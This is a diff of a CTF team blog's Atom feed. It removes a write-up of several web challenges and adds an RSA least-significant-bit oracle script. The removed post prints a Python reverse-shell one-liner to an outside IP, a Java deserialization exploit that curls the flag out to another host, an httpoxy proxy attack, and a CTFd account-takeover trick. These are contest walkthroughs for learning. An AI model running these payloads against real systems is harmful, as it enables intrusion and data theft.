+    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_crypto-lancet/</id>
+    <published>2020-03-09T01:52:20.000Z</published>
+    <updated>2020-03-21T09:14:15.291Z</updated>
     
-    <content type="html"><![CDATA[<p>V&amp;N招新赛部分web题解</p><a id="more"></a><h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>考点：ctfd漏洞</p><p>参考链接<a href="https://www.colabug.com/2020/0204/6940556/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/</a>漏洞的相关分析，上文写的很详细，这里就不再介绍。</p><p>解题步骤：</p><ol><li>先注册一个admin的账号，通过在admin前面加空格来绕过重复限制。</li><li>生成忘记密码的链接。</li><li>更改自己用户名为非admin.</li><li>点击更改密码的链接，改后登录</li></ol><p><img src="/2020/02/29/V/image-20200229183951772.png" alt="image-20200229183951772"></p><p>下载，后就得到flag.</p><h2 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h2><p>考点：python反弹shell   proc目录</p><p>访问就可以得到源码，右键源代码看到的代码自动有换行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route('/flag')</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route('/shell')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">"rm -f flag.txt"</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"app.py"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>看到很简单的源码，有两个路由，</p><ul><li>/  ：可以得到app.py源码</li><li>/shell  : 通过传入c变量可以执行命令，但是会删除flag.txt文件。</li></ul><p>开始时，想着通过类似时间盲注的方法去做题，后来一想python可以直接反弹shell,</p><p>然后开了个linux-lab，反弹shell。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=python3%<span class="number">20</span>-c%<span class="number">20</span>%<span class="number">27</span><span class="keyword">import</span>%<span class="number">20</span>socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%<span class="number">22174.0</span><span class="number">.216</span><span class="number">.234</span>%<span class="number">22</span>,<span class="number">1234</span>));os.dup2(s.fileno(),<span class="number">0</span>);%<span class="number">20</span>os.dup2(s.fileno(),<span class="number">1</span>);%<span class="number">20</span>os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([%<span class="number">22</span>/bin/sh%<span class="number">22</span>,%<span class="number">22</span>-i%<span class="number">22</span>]);%<span class="number">27</span></span><br></pre></td></tr></table></figure><p><img src="/2020/02/29/V/image-20200229184920698.png" alt="image-20200229184920698"></p><p>之后就是找flag了，这里又学到了linux中/proc目录内容。更详细的可以<a href="https://blog.spoock.com/2019/10/08/proc/" target="_blank" rel="noopener">参考</a>这篇文章，总结的很详细。</p><p><img src="/2020/02/29/V/image-20200229185248748.png" alt="image-20200229185248748"></p><p>由于ps命令不可用，这里我们就去翻一下文件夹</p><p><img src="/2020/02/29/V/image-20200229185546941.png" alt></p><p>最后在/proc/10/fd文件里看见了flag</p><h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>这题也给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>队友直接发了一个<strong>cve-2016-5385</strong>，然后去网上查一查，看到<a href="https://github.com/vulhub/vulhub/blob/master/cgi/httpoxy/www/index.php" target="_blank" rel="noopener">vulhub里面就有</a>看一下里里面的源码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: application/json; charset=utf-8'</span>);</span><br><span class="line"></span><br><span class="line">$client = <span class="keyword">new</span> Client([</span><br><span class="line">    <span class="comment">// Base URI is used with relative requests</span></span><br><span class="line">    <span class="string">'base_uri'</span> =&gt; <span class="string">'http://httpbin.org'</span>,</span><br><span class="line">    <span class="comment">// You can set any number of default request options.</span></span><br><span class="line">    <span class="string">'timeout'</span>  =&gt; <span class="number">2.0</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$response = $client-&gt;get(<span class="string">'http://httpbin.org/get'</span>);</span><br><span class="line"></span><br><span class="line">$body = $response-&gt;getBody();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $body;</span><br></pre></td></tr></table></figure><p>源码差不多</p><blockquote><p>简单来说，根据RFC 3875规定，cgi（fastcgi）要将用户传入的所有HTTP头都加上<code>HTTP_</code>前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的<code>HTTP_PROXY</code>值作为HTTP代理地址。于是，恶意用户通过提交<code>Proxy: http://evil.com</code>这样的HTTP头，将使用缺陷类库的网站的代理设置为<code>http://evil.com</code>，进而窃取数据包中可能存在的敏感信息。</p></blockquote><p>这种漏洞的利用，通过在http请求头中添加Proxy头，就可以把请求代理到恶意的代理服务器，进而可以窃取数据报的敏感信息，也可以篡改请求报的响应。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面的关键代码可以看到，要得到flag,需要满足<code>$data[&#39;success&#39;] === true</code>，如果请求代理到我们的服务器，然后回向<a href="http://127.0.0.1:5000/api/eligible发送请求，如果发送的请求，json解码后，$data[&#39;success&#39;]为true,就会得到flag。" target="_blank" rel="noopener">http://127.0.0.1:5000/api/eligible发送请求，如果发送的请求，json解码后，$data[&#39;success&#39;]为true,就会得到flag。</a></p><p>解题步骤</p><ul><li>用我们的apache服务器作为代理服务器</li></ul><p><img src="/2020/02/29/V/image-20200229192230132.png" alt="image-20200229192230132"></p><ul><li><p>然后用php在本地起一个服务器，监听5000端口，在api/eligible目录下新建index.php,脚本输出，解码后$data[‘success’]为true。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">"success"</span>=&gt;<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode($a);</span><br></pre></td></tr></table></figure><p>本地在用php启一个php的内置服务器，端口为5000</p><p><img src="/2020/02/29/V/image-20200229193926226.png" alt="image-20200229193926226"></p></li><li><p>然后burp再发包，触发条件，得到flag。</p></li></ul><p><img src="/2020/02/29/V/image-20200229194145302.png" alt="image-20200229194145302"></p><h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>考点：java反序列化</p><p>题目给了源码是war包，用tomcat部署后，</p><p><img src="/2020/02/29/V/image-20200301110922154.png" alt="image-20200301110922154"></p><p>浏览一下功能，可以上传，但是要webmanage权限，开始以为要修改权限，上传个图片马 什么的。</p><p>然后审计源码，由于之前没有做过java的题，对java的程序框架不是很了解，一边百度一边理解，<img src="/2020/02/29/V/image-20200301111336301.png" alt></p><p>程序大致的框架就是这样（本人的理解），有控制器，有jsp文件，lib文件夹里面的都是引用的jar包，看了里面的jar包，没有反序列化漏洞的版本。这里的ClientinfoFilter就是一个全局过滤器，在web.xml文件中，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>clientinfo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.filters.ClentInfoFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>clientinfo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>*<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>filter-class  必需元素，它指定过滤器实现类的完全限定名。</p><p>filter-name  这个必需的元素必须与用filter元素声明时给予过滤器的名称相匹配。</p><p>servlet-name  此元素给出一个名称，此名称必须与利用servlet元素给予servlet或JSP页面的名称相匹配。</p></blockquote><p><a href="http://www.51gjie.com/javaweb/868.html" target="_blank" rel="noopener">参考链接</a></p><p><img src="/2020/02/29/V/image-20200301112633247.png" alt="image-20200301112633247"></p><p>然后我们继续看ClientinfoFilter中的doFilter方法，</p><p><img src="/2020/02/29/V/image-20200301112812260.png" alt="image-20200301112812260"></p><p>首先去取cookie,如果cookie中有cinfo,exist就为true,然后进入判断，将cookie中的cinfo值base64解码，然后调用Tools.parse()方法，继续跟进</p><p><img src="/2020/02/29/V/image-20200301113107762.png" alt="image-20200301113107762"></p><p>parse方法对输入进行了反序列化，可以发现Tools类重写了readObject方法，<a href="http://www.lmxspace.com/2019/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%B7%B1%E7%A9%B6/" target="_blank" rel="noopener">那么参考大佬的文章</a>，重写反序列化方法会有风险，而且这里重写的方法还调用了ProcessBuilder().start)(),这个方法可以执行命令，到了这里，我们的思路就很清晰了，通过构造cookie,触发反序列化，调用重写的readObject方法，进而调用ProcessBuilder.start()方法，执行命令。</p><p>首先，我们在本地尝试一下可不可以，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//exp.java</span></span><br><span class="line"><span class="keyword">package</span> com.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Tools test = <span class="keyword">new</span> Tools();</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = Tools.create(test);</span><br><span class="line">            Base64.Encoder  encoder = Base64.getEncoder();</span><br><span class="line">            System.out.println(encoder.encodeToString(bytes));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上图我们可以看到create()方法中调用了writeObject，所以我们可以重写writeObject（）函数，来进一步利用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Tools.java</span></span><br><span class="line"><span class="keyword">package</span> com.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tools</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String testCall;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tools</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(bytes));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] create(Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Object obj = in.readObject();</span><br><span class="line">        (<span class="keyword">new</span> ProcessBuilder((String[])((String[])obj))).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span><span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="comment">//String[] cmd=&#123;"/bin/sh", "-c","curl -d `/readflag` 174.0.219.93:8888"&#125;;</span></span><br><span class="line">        String[] cmd=&#123;<span class="string">"calc"</span>&#125;;</span><br><span class="line">        out.writeObject(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/29/V/image-20200301120719913.png" alt="image-20200301120719913"></p><p>将运行后的base64，放入test.java中测试一下</p><p><img src="/2020/02/29/V/image-20200301120834520.png" alt="image-20200301120834520"></p><p>之后就可以执行命令了，<a href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">这里参考一下师傅的文章</a>，里面讲解了Runtime.getRuntime().exec(cmd)和ProcessBuilder pb=new ProcessBuilder(cmd)的区别和用法，</p><p>然后我们把命令改下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span><span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">      String[] cmd=&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>,<span class="string">"curl -d `/readflag` 174.0.219.93:8888"</span>&#125;;</span><br><span class="line">      <span class="comment">//String[] cmd=&#123;"calc"&#125;;</span></span><br><span class="line">      out.writeObject(cmd);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>生成的替换下cookie,就得到了 flag</p><p><img src="/2020/02/29/V/image-20200301122930606.png" alt="image-20200301122930606"></p>]]></content>
+    <content type="html"><![CDATA[<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>访问服务器可得e、n，每次访问的值是随机的。服务器上可选加密或者解密两种方式。正常解法应该是构造（c*2）^e % n，返回值除以2便是m。</li><li>但是由于服务器返回的解密结果不全，经验证仅为结果的最后一位。</li><li>通过其返回结果可判断，由于n为奇数，flag最后字符为’}’因此m也为奇数。m乘以任意一个偶数模n肯定为奇数，除非m&gt;n</li><li>因此构造（c<em>（2^i））^e % n 爆破出i，即恰好当（c</em>（2^i））^e % n的返回值为偶数时可得n 约等于m*i</li><li>通过上述方法爆破i可求出flag</li><li>由于比赛时该题没做出来，后来复现时服务器关闭了，现放VN脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> enc</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> decimal</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(c)</span>:</span></span><br><span class="line">    fuck = enc(long_to_bytes(c))</span><br><span class="line">    l = len(fuck)</span><br><span class="line">    r.recvuntil(<span class="string">'want here'</span>)</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'send how long you want to decrypt'</span>)</span><br><span class="line">    r.send(str(l))</span><br><span class="line">    r.recvuntil(<span class="string">'send the message in base64 encode'</span>)</span><br><span class="line">    r.send(fuck)</span><br><span class="line">    res = r.recvline()</span><br><span class="line">    res = r.recvline()</span><br><span class="line">    log.info(res)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'res:1'</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'res:0'</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(n,e,c)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> c_of_2</span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k</span><br><span class="line">    lower = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    upper = decimal.Decimal(n)</span><br><span class="line">    c_of_2 = pow(<span class="number">2</span>, e, n)</span><br><span class="line">    c = (c * c_of_2) % n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        possible_plaintext = (lower + upper) / <span class="number">2</span></span><br><span class="line">        flag = oracle(c)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            upper = possible_plaintext</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lower = possible_plaintext</span><br><span class="line">        c = (c * c_of_2) % n</span><br><span class="line">        <span class="keyword">print</span> i, flag, int(upper - lower)</span><br><span class="line">    <span class="keyword">return</span> int(upper)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'121.37.174.33'</span>,<span class="number">9999</span>)</span><br><span class="line">r.recvuntil(<span class="string">'n:'</span>)</span><br><span class="line">n = r.recvuntil(<span class="string">'\ne:'</span>,drop=<span class="literal">True</span>)</span><br><span class="line">n = int(n)</span><br><span class="line">r.recvuntil(<span class="string">'flag:'</span>)</span><br><span class="line">c = r.recvuntil(<span class="string">'\nyou'</span>,drop=<span class="literal">True</span>)</span><br><span class="line">c = int(c)</span><br><span class="line">log.success(hex(n))</span><br><span class="line">log.success(hex(c))</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(partial(n,e,c))</span><br></pre></td></tr></table></figure></li></ul>]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;V&amp;amp;N招新赛部分web题解&lt;/p&gt;
-&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+      思路
+ * 访问服务器可得e、n，每次访问的值是随机的。服务器上可选加密或者解密两种方式。正常解法应该是构造（c*2）^e % n，返回值除以2便是m。
+ * 但是由于服务器返回的解密结果不全，经验证仅为结果的最后一位。
+ * 通过其返回结果可判断，由于n为奇数，flag最后字符为’}’因此m也为奇数。m乘以任意一个偶数模n肯定为奇数，除非m&gt;n
+ * 因此构造（c（2^i））^e % n 爆破出i，即恰好当（c（2^i））^e % n的返回值为偶数时可得n 约等于m*i
+ * 通过上述方法爆破i可求出flag
+ * 由于比赛时该题没做出来，后来复现时服务器关闭了，现放VN脚本1
+   2
+ 
     
     </summary>
     
     
+      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
+    
+      <category term="Java" scheme="https://boiteam.github.io/categories/Web/Java/"/>
+    
+    
+      <category term="服务器访问" scheme="https://boiteam.github.io/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AE%BF%E9%97%AE/"/>
+    
+      <category term="RSA算法原理" scheme="https://boiteam.github.io/tags/RSA%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/"/>
+    
+      <category term="RSA最低位爆破" scheme="https://boiteam.github.io/tags/RSA%E6%9C%80%E4%BD%8E%E4%BD%8D%E7%88%86%E7%A0%B4/"/>
+    
+      <category term="模数构造" scheme="https://boiteam.github.io/tags/%E6%A8%A1%E6%95%B0%E6%9E%84%E9%80%A0/"/>
     
   </entry>
   
